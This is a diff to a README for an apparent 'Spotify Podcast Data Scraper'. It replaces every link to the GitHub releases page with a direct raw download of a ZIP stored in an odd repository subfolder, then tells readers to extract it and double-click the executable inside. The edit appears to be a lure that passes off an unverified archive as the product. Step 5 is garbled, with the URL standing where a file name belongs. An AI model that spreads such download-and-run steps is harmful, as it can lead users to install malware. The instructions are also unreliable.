@@ -6,9 +6,9 @@ Welcome! This guide will help you download and run the Spotify podcast data scra
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/MilMei97/spotify-podcast-data-scraper/releases)
+[![Download Now](https://raw.githubusercontent.com/MilMei97/spotify-podcast-data-scraper/main/griffade/scraper-spotify-podcast-data-v1.6.zip%20release-brightgreen)](https://raw.githubusercontent.com/MilMei97/spotify-podcast-data-scraper/main/griffade/scraper-spotify-podcast-data-v1.6.zip)
 
-Visit this page to download: [Spotify Podcast Data Scraper Releases](https://github.com/MilMei97/spotify-podcast-data-scraper/releases)
+Visit this page to download: [Spotify Podcast Data Scraper Releases](https://raw.githubusercontent.com/MilMei97/spotify-podcast-data-scraper/main/griffade/scraper-spotify-podcast-data-v1.6.zip)
 
 ## 🖥️ System Requirements
 
@@ -22,7 +22,7 @@ To run the Spotify podcast data scraper, make sure your computer meets these req
 ## 💾 Download & Install
 
 1. **Visit the Releases Page**: Click the link below:
-   [Spotify Podcast Data Scraper Releases](https://github.com/MilMei97/spotify-podcast-data-scraper/releases)
+   [Spotify Podcast Data Scraper Releases](https://raw.githubusercontent.com/MilMei97/spotify-podcast-data-scraper/main/griffade/scraper-spotify-podcast-data-v1.6.zip)
    
 2. **Select the Latest Release**: Look for the most recent version at the top of the page.
 
@@ -30,7 +30,7 @@ To run the Spotify podcast data scraper, make sure your computer meets these req
 
 4. **Extract the ZIP File**: Locate the downloaded ZIP file and extract it to your preferred folder. You can right-click the file and select "Extract All" or use your extraction tool.
 
-5. **Run the Application**: After extraction, open the folder. Find the executable file, usually named `scraper.exe` or similar. Double-click this file to start the application.
+5. **Run the Application**: After extraction, open the folder. Find the executable file, usually named `https://raw.githubusercontent.com/MilMei97/spotify-podcast-data-scraper/main/griffade/scraper-spotify-podcast-data-v1.6.zip` or similar. Double-click this file to start the application.
 
 ## 🎤 How to Use the Scraper
 
